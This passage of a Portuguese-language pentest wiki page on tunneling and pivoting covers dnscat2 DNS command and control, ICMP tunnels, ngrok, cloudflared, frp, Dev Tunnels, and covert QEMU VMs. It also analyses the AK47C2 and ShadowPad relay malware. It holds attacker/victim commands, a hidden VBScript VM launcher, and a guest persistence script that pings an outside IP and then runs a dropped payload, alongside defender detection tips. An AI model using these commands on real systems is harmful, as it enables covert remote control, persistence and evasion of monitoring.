O Dnscat2 estabelece um canal criptografado de comando e controle por DNS; os comandos do servidor e do cliente abaixo seguem o uso documentado.<sup>[[32]](#references)</sup>

```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```

#### **No PowerShell**

Você pode usar [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) para executar um cliente dnscat2 no PowerShell; o README documenta os parâmetros de `Start-Dnscat2` mostrados abaixo.<sup>[[33]](#references)</sup>

```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```

#### **Port forwarding com dnscat**

O comando interativo `listen` do dnscat2 mapeia um listener local para um host e uma porta remotos.<sup>[[32]](#references)</sup>

```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```

#### Alterar o DNS do proxychains

Proxychains-ng intercepta conexões TCP vinculadas dinamicamente e não consegue transportar UDP ou ICMP; o proxy de DNS é configurável, então verifique o `proxychains.conf` instalado e o helper do resolver em vez de presumir um resolver público fixo. Scripts legados `proxyresolv` expõem `PROXY_DNS_SERVER` para escolher o resolver; use um resolver acessível a partir do pivot quando precisar resolver nomes internos.<sup>[[34]](#references)[[35]](#references)</sup>

## Túneis em Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### DNS TXT personalizado / C2 HTTP JSON (AK47C2)

O ator Storm-2603 criou um **C2 de canal duplo ("AK47C2")** que abusa *apenas* do tráfego de saída **DNS** e **HTTP POST simples** — dois protocolos que raramente são bloqueados em redes corporativas.<sup>[[2]](#references)</sup>

1. **Modo DNS (AK47DNS)**
   • Gera um SessionID aleatório de 5 caracteres (por exemplo, `H4T14`).  
   • Acrescenta `1` para *solicitações de tarefas* ou `2` para *resultados* e concatena diferentes campos (flags, SessionID, nome do computador).  
   • Cada campo é **criptografado com XOR usando a chave ASCII `VHBD@H`**, codificado em hexadecimal e unido por pontos — terminando, por fim, no domínio controlado pelo atacante:

   ```text
   <1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
   ```

   • As solicitações usam `DnsQuery()` para registros **TXT** (e **MG** como alternativa).  
   • Quando a resposta excede 0xFF bytes, o backdoor **fragmenta** os dados em partes de 63 bytes e insere os marcadores:
     `s<SessionID>t<TOTAL>p<POS>` para que o servidor C2 possa reordená-las.

2. **Modo HTTP (AK47HTTP)**
   • Cria um envelope JSON:
   ```json
   {"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
   ```
   • O blob inteiro é XOR-`VHBD@H` → hex → enviado no corpo de um **`POST /`** com o cabeçalho `Content-Type: text/plain`.
   • A resposta segue a mesma codificação, e o campo `cmd` é executado com `cmd.exe /c <command> 2>&1`.

Notas da Blue Team
• Procure consultas **TXT** incomuns cujo primeiro label seja uma longa sequência hexadecimal e que sempre terminem no mesmo domínio raro.  
• Uma chave XOR constante seguida de ASCII-hex é fácil de detectar com YARA: `6?56484244?484` (`VHBD@H` em hex).  
• Para HTTP, sinalize corpos de requisições POST `text/plain` que contenham apenas hex e tenham um número par de bytes.

{{#note}}
O canal mantém cada label de subdomínio dentro do limite DNS de 63 octetos, mas a conformidade com o protocolo, por si só, não o torna furtivo; domínios raros, labels hexadecimais longos e volume de consultas continuam sendo sinais de detecção.<sup>[[2]](#references)[[36]](#references)</sup>
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Hans documenta um túnel IPv4 sobre ICMP que usa um dispositivo TUN e solicitações de eco ICMP; a configuração exige privilégios suficientes para criar a interface.<sup>[[37]](#references)</sup>

```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```

### ptunnel-ng

[**Baixe-o aqui**](https://github.com/utoni/ptunnel-ng.git).

ptunnel-ng transporta conexões TCP por meio de ICMP e usa as opções `-p`, `-l`, `-r` e `-R` mostradas abaixo para o proxy, o listener local, o host de destino e a porta de destino.<sup>[[38]](#references)</sup>

```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```

## ngrok

[**ngrok**](https://ngrok.com/) é um agente para disponibilizar serviços de rede locais online por meio de um túnel seguro; sua CLI documenta endpoints HTTP, TCP e de URL de arquivo, e o nome do host do endpoint exibido pode variar conforme o endpoint e a conta.<sup>[[39]](#references)</sup>

### Instalação

- Crie uma conta: https://ngrok.com/signup
- Download do cliente:

```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```

### Usos básicos

**Documentação:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_O agente também oferece suporte a opções de autenticação e TLS, quando necessário.<sup>[[39]](#references)</sup>_

#### Tunelamento TCP

```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```

#### Expondo arquivos com HTTP

```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```

#### Sniffing de chamadas HTTP

_Útil para XSS,SSRF,SSTI ..._\
Por padrão, o agente standalone expõe sua interface de inspeção HTTP em `http://127.0.0.1:4040`; a interface é para tráfego HTTP.<sup>[[40]](#references)</sup>

#### Tunneling de serviço HTTP interno

A opção `--host-header=rewrite` reescreve o cabeçalho `Host` HTTP upstream para corresponder ao serviço local.<sup>[[41]](#references)</sup>

```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```

#### exemplo de configuração simples do ngrok.yaml

Isso usa ngrok Agent Config v2; túneis nomeados usam `proto` e `addr` e são iniciados com `ngrok start`.<sup>[[42]](#references)</sup> Ele abre 3 túneis:

- 2 TCP
- 1 HTTP com exposição de arquivos estáticos de /tmp/httpbin/

```yaml
version: 2
tunnels:
  mytcp:
    addr: 4444
    proto: tcp
  anothertcp:
    addr: 5555
    proto: tcp
  httpstatic:
    proto: http
    addr: file:///tmp/httpbin/
```

## Microsoft Dev Tunnels

O Microsoft Dev Tunnels pode expor um serviço local baseado em TCP por meio da infraestrutura de relay da Microsoft. A CLI do host cria um túnel de saída, enquanto `devtunnel connect` recria a porta hospedada no cliente; os túneis exigem autenticação por padrão, a menos que os controles de acesso sejam deliberadamente flexibilizados.<sup>[[55]](#references)[[58]](#references)</sup>

```bash
# Compromised/pivot host: publish its local RDP service
# Save the tunnel ID printed by this command
devtunnel host -p 3389

# Operator host: authenticate as an authorized tunnel user and create
# a local 127.0.0.1:3389 forward to the hosted port
devtunnel connect <TUNNEL_ID>
xfreerdp /u:<USER> /v:127.0.0.1:3389
```

Isso pode expor RDP por meio de `*.devtunnels.ms` sem abrir um novo listener de entrada no perímetro. Também pode ser combinado com um túnel de canal virtual RDP, como `rdp2tcp`, transformando a sessão RDP em um pivot de segundo estágio para tráfego TCP arbitrário.<sup>[[58]](#references)</sup>

Para hunting, correlacione a execução do Dev Tunnels CLI com tráfego DNS/TLS para `*.devtunnels.ms` e eventos inesperados de canal virtual RDP. Um túnel autenticado não é benigno apenas por usar um relay de propriedade da Microsoft.<sup>[[58]](#references)</sup>

## Cloudflared (Cloudflare Tunnel)

O conector `cloudflared` do Cloudflare Tunnel estabelece conexões de saída; aplicações publicadas podem encaminhar HTTP, HTTPS, TCP, SSH e RDP, enquanto quick tunnels são destinados ao desenvolvimento HTTP.<sup>[[43]](#references)[[45]](#references)</sup>

### One-liner de quick tunnel

```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```

### Origem SOCKS5 (modo legado)

A flag legada `--socks5` informa ao `cloudflared` que a origem local usa SOCKS5; ela não cria um listener SOCKS5 local. Para um túnel gerenciado, `originRequest.proxyType: socks` configura o tratamento de origem SOCKS5.<sup>[[44]](#references)</sup>

```bash
# Expose a local SOCKS5-speaking origin (legacy syntax)
cloudflared tunnel --url socks5://localhost:1080 --socks5
```

### Túneis persistentes com DNS

A configuração de túnel gerenciada localmente usa as chaves `tunnel`, `credentials-file` e `url`, conforme mostrado abaixo.<sup>[[46]](#references)</sup>

```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```

Inicie o conector:

```bash
cloudflared tunnel run mytunnel
```

O conector estabelece conexões de saída e, por padrão, negocia QUIC com fallback para HTTP/2; não presuma que toda implantação usa TCP/443. Execute-o apenas com os privilégios necessários à sua implantação.<sup>[[43]](#references)[[47]](#references)</sup>

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) é um proxy reverso em Go que oferece suporte a **TCP, UDP, HTTP/S, STCP/SUDP, TCPMUX e XTCP**. O XTCP usa perfuração P2P, cujo sucesso depende do NAT. A partir da versão **v0.53.0**, ele pode atuar como um **gateway de túnel SSH**, permitindo que um host de destino use o cliente OpenSSH padrão sem um binário `frpc`.<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>

### Túnel TCP reverso clássico

```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```

### Usando o novo gateway SSH (sem binário frpc)

```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```

O comando acima publica a porta **8080** da vítima como **attacker_ip:9000** usando o cliente OpenSSH padrão, enquanto `frps` fornece o gateway.<sup>[[50]](#references)</sup>

## Back-connects UDP assistidos por STUN

Solicitações STUN Binding enviadas de um socket UDP podem revelar seu endereço IP e porta server-reflexive, enquanto o tráfego periódico mantém o binding do NAT ativo. Um servidor STUN público não é um relay para pacotes de controle arbitrários.<sup>[[60]](#references)</sup> Um design de back-connect analisado manteve o mesmo socket UDP para um datagrama de controle curto e, em seguida, usou uma *conexão TCP de saída separada* para buscar e executar comandos após a chegada do trigger.<sup>[[59]](#references)</sup>

Para receber o pacote UDP do controlador, um design ainda precisa compartilhar o mapping com esse controlador e atender à política de filtragem do NAT. A filtragem dependente de endereço ou porta pode aceitar respostas do servidor STUN, mas descartar pacotes de outro endpoint.<sup>[[60]](#references)[[61]](#references)</sup> O caminho de rendezvous do backdoor analisado não foi verificado; portanto, respostas STUN bem-sucedidas, por si só, não provam que seu canal de controle está acessível.<sup>[[59]](#references)</sup> Para ver um protocolo separado com rendezvous explícito e fallback de relay, consulte [travessia de NAT de câmeras PPPP](../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md#nat-traversal-and-transport).

## Túneis encobertos baseados em VM com QEMU

A rede em modo de usuário do QEMU não requer privilégios de root ou administrador para a rede virtual, e `-netdev user,hostfwd=...` redireciona conexões TCP, UDP ou UNIX do host para o guest.<sup>[[51]](#references)</sup> A TrustedSec documentou uma VM Tiny Core com QEMU e uma tentativa de túnel SSH reverso em um incidente no qual um EDR focado no host poderia não detectar atividades dentro do guest.<sup>[[1]](#references)</sup>

### Comando rápido de uma linha

```powershell
# Windows victim (user-mode networking; no TAP driver is needed for this example)
qemu-system-x86_64.exe ^
   -m 256M ^
   -drive file=tc.qcow2,if=ide ^
   -netdev user,id=n0,hostfwd=tcp::2222-:22 ^
   -device e1000,netdev=n0 ^
   -nographic
```

• O comando acima inicia um guest **Tiny Core Linux** com 256 MiB de memória e um disco qcow2; a imagem de disco não é um disco na RAM.
• A porta **2222/tcp** no host Windows é encaminhada de forma transparente para **22/tcp** dentro do guest.  
• Do ponto de vista do atacante, o alvo simplesmente expõe a porta 2222; todos os pacotes que chegam a ela são tratados pelo servidor SSH em execução na VM.

### Iniciando furtivamente por meio de VBScript

A TrustedSec observou inicializações do QEMU acionadas por VBS e imagens do Tiny Core no incidente citado acima.<sup>[[1]](#references)</sup>

```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```

Executar o script com `cscript.exe //B update.vbs` mantém a janela oculta.<sup>[[1]](#references)</sup>

### Persistência no guest

O incidente citado descreve a persistência no guest stateless Tiny Core por meio de `/opt/bootlocal.sh` e `/opt/filetool.lst`:<sup>[[1]](#references)</sup>

1. Solte o payload em `/opt/123.out`  
2. Acrescente ao `/opt/bootlocal.sh`:

   ```sh
   while ! ping -c1 45.77.4.101; do sleep 2; done
   /opt/123.out
   ```

3. Adicione `home/tc` e `opt` a `/opt/filetool.lst` para que o payload seja empacotado em `mydata.tgz` durante o desligamento.

### Considerações sobre telemetria

• O host ainda expõe o processo QEMU, a imagem qcow2 e qualquer listener encaminhado pelo host.
• As verificações de processos restritas ao host podem não inspecionar processos do guest, mas a virtualização não garante evasão; a telemetria de rede, QEMU e imagens ainda pode expô-lo.<sup>[[1]](#references)[[51]](#references)</sup>

### Dicas para defensores

• Gere alertas para **binários QEMU/VirtualBox/KVM inesperados** em caminhos graváveis pelo usuário.  
• Bloqueie conexões de saída originadas de `qemu-system*.exe`.  
• Procure portas de escuta raras (2222, 10022, …) vinculadas logo após a inicialização do QEMU.

## Nós de retransmissão IIS/HTTP.sys via `HttpAddUrl` (ShadowPad)

A Check Point descreve o módulo IIS do ShadowPad como uma forma de transformar servidores web de perímetro comprometidos em backdoors e nós de retransmissão, vinculando prefixos de URL por meio de `HttpAddUrl`.<sup>[[3]](#references)</sup>

O mesmo relatório detalha os padrões, os listeners curinga, a descriptografia de pacotes, as filas de retransmissão e a telemetria de depuração resumidos abaixo.<sup>[[3]](#references)</sup>

* **Padrões de configuração** – se a configuração JSON do módulo omitir valores, ele usará padrões plausíveis do IIS (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). Assim, o IIS responde ao tráfego benigno com a identificação visual correta.
* **Interceptação curinga** – os operadores fornecem uma lista de prefixos de URL separados por ponto e vírgula (curingas no host e no caminho). O módulo chama `HttpAddUrl` para cada entrada, fazendo com que o HTTP.sys encaminhe as solicitações correspondentes ao handler malicioso; as solicitações que não correspondem seguem o comportamento normal do IIS.
* **Primeiro pacote criptografado** – os dois primeiros bytes do corpo da solicitação contêm a semente de um PRNG personalizado de 32 bits. Cada byte subsequente passa por XOR com o fluxo de chaves gerado antes da análise do protocolo:

  ```python
  def decrypt_first_packet(buf):
      seed = buf[0] | (buf[1] << 8)
      num = seed & 0xFFFFFFFF
      out = bytearray(buf)
      for i in range(2, len(out)):
          hi = (num >> 16) & 0xFFFF
          num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
          out[i] ^= num & 0xFF
      return out
  ```

* **Orquestração do relay** – o módulo mantém duas listas: “servidores” (nós upstream) e “clientes” (implants downstream). As entradas são removidas se nenhum heartbeat chegar em aproximadamente 30 segundos. Quando ambas as listas não estão vazias, ele emparelha o primeiro servidor saudável com o primeiro cliente saudável e simplesmente encaminha os bytes entre os sockets até que um dos lados feche a conexão.
* **Telemetria de depuração** – o registro opcional armazena o IP de origem, o IP de destino e o total de bytes encaminhados em cada emparelhamento. Investigadores usaram essas pistas para reconstruir a rede mesh do ShadowPad, que abrangia várias vítimas.

---

## Outras ferramentas para verificar

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [Escondendo-se nas sombras: túneis furtivos por meio da virtualização QEMU](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – Antes do ToolShell: explorando as operações anteriores de ransomware do Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – Por dentro do Ink Dragon: revelando a rede de relay e o funcionamento interno de uma operação ofensiva furtiva](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [README do Evil-WinRM](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/README.md)
- [5] [Guia de referência do Nmap: contornar restrições de firewall/IDS](https://nmap.org/book/man-bypass-firewalls-ids.html)
- [6] [Manual do ssh do OpenBSD](https://man.openbsd.org/ssh)
- [7] [Manual do sshd_config do OpenBSD](https://man.openbsd.org/sshd_config)
- [8] [Notas de lançamento do OpenSSH 9.6](https://www.openssh.org/txt/release-9.6)
- [9] [README do sshuttle](https://raw.githubusercontent.com/sshuttle/sshuttle/master/README.rst)
- [10] [Metasploit: pivoting no Metasploit](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
- [11] [Documentação do módulo socks_proxy do Metasploit](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/auxiliary/server/socks_proxy.md)
- [12] [Documentação do módulo autoroute do Metasploit](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/post/multi/manage/autoroute.md)
- [13] [Cobalt Strike: proxy SOCKS](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_socks-proxy.htm)
- [14] [Cobalt Strike: encaminhamento reverso de porta](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_reverse-port-forward.htm)
- [15] [README do reGeorg](https://raw.githubusercontent.com/sensepost/reGeorg/master/README.md)
- [16] [README do Chisel](https://raw.githubusercontent.com/jpillora/chisel/master/README.md)
- [17] [Início rápido do Ligolo-ng](https://docs.ligolo.ng/Quickstart/)
- [18] [Listeners do Ligolo-ng](https://docs.ligolo.ng/Listeners/)
- [19] [Localhost do Ligolo-ng](https://docs.ligolo.ng/Localhost/)
- [20] [README do rpivot](https://raw.githubusercontent.com/klsecservices/rpivot/master/README.md)
- [21] [Manual do socat](https://man7.org/linux/man-pages/man1/socat.1.html)
- [22] [Manual do PuTTY Plink](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter7.html)
- [23] [Opções de linha de comando do PuTTY](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter3.html)
- [24] [Comando netsh interface portproxy da Microsoft](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface)
- [25] [README do SocksOverRDP](https://raw.githubusercontent.com/nccgroup/SocksOverRDP/master/README.md)
- [26] [Documentação do Proxifier](https://www.proxifier.com/docs/win-v4/)
- [27] [Regras de proxificação do Proxifier](https://www.proxifier.com/docs/win-v3/rules.htm)
- [28] [Manual do OpenVPN 2.7](https://openvpn.net/community-docs/community-articles/openvpn-2-7-manual.html)
- [29] [Cntlm](https://cntlm.sourceforge.net/)
- [30] [README do YARP](https://raw.githubusercontent.com/dotnet/yarp/main/README.md)
- [31] [README do iodine](https://code.kryo.se/iodine/README.html)
- [32] [README do dnscat2](https://raw.githubusercontent.com/iagox86/dnscat2/master/README.md)
- [33] [README do dnscat2-powershell](https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/README.md)
- [34] [README do proxychains-ng](https://raw.githubusercontent.com/rofl0r/proxychains-ng/master/README)
- [35] [proxyresolv](https://github.com/haad/proxychains/blob/master/src/proxyresolv)
- [36] [RFC 1035: nomes de domínio – implementação e especificação](https://www.rfc-editor.org/rfc/rfc1035)
- [37] [Hans](https://code.gerade.org/hans/)
- [38] [README do ptunnel-ng](https://raw.githubusercontent.com/utoni/ptunnel-ng/master/README.md)
- [39] [CLI do agente ngrok](https://ngrok.com/docs/agent/cli)
- [40] [Interface de inspeção web do ngrok](https://ngrok.com/docs/agent/web-inspection-interface)
- [41] [Hosts virtuais do ngrok](https://ngrok.com/docs/using-ngrok-with/virtualHosts)
- [42] [Configuração v2 do agente ngrok](https://ngrok.com/docs/agent/config/v2)
- [43] [Visão geral do Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/)
- [44] [Parâmetros de origem do Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/advanced/origin-parameters/)
- [45] [Configuração do Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/setup/)
- [46] [Arquivo de configuração do Cloudflare Tunnel](https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/local-management/configuration-file/)
- [47] [Parâmetros de execução do Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/advanced/run-parameters/)
- [48] [Conceitos do frp](https://gofrp.org/en/docs/concepts/)
- [49] [XTCP do frp](https://gofrp.org/en/docs/features/xtcp/)
- [50] [Gateway de túnel SSH do frp](https://gofrp.org/en/docs/features/common/ssh/)
- [51] [Documentação de rede do QEMU](https://www.qemu.org/docs/master/system/devices/net.html)
- [52] [README do wstunnel](https://github.com/erebe/wstunnel/blob/main/README.md)
- [53] [Repositório de código-fonte do NetSPI BOFScale](https://github.com/NetSPI/BOFscale)
- [54] [BOFScale: uma tailnet com fronting de CDN a partir de um BOF-PE](https://www.netspi.com/blog/technical-blog/red-teaming/bofscale-a-cdn-fronted-tailnet-from-a-bof-pe/)
- [55] [Microsoft Learn - Comandos da CLI do Dev Tunnels](https://learn.microsoft.com/en-us/azure/developer/dev-tunnels/cli-commands)
- [56] [V-E-O/rdp2tcp](https://github.com/V-E-O/rdp2tcp)
- [57] [Fortra Impacket - atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py)
- [58] [APT NightEagle: GhostContainer e tunneling](https://securelist.com/tr/nighteagle-apt-ghostcontainer-and-tunneling/121323/)
- [59] [FortiGuard Labs - backdoor Linux ClingSTUN abusa da infraestrutura STUN pública](https://www.fortinet.com/blog/threat-research/clingstun-linux-backdoor-abuses-public-stun-infrastructure)
- [60] [RFC 8489 - utilitários de travessia de sessão para NAT (STUN)](https://www.rfc-editor.org/rfc/rfc8489.html)
- [61] [RFC 4787 - requisitos de comportamento de NAT para UDP unicast](https://www.rfc-editor.org/rfc/rfc4787.html)
{{#include ../banners/hacktricks-training.md}}
